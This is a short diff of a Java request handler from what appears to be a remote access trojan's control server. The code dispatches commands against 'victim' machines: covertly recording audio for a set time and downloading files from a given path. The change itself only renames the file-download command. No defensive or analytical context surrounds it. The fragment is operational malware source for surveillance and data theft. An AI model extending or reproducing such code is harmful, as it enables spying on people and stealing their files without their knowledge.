@@ -149,7 +149,7 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                 case "start.audio.record":
                     ((AVictim) targetVictim).sendStartAudioRecord((Long) request.get("seconds"), user.getLogin());
                     break;
-                case "download.file":
+                case "start.download.file":
                     DownloadManager downloadManager = new DownloadManager(user, targetVictim, (String) request.get("path"));
                     downloadManager.start();
                     break;
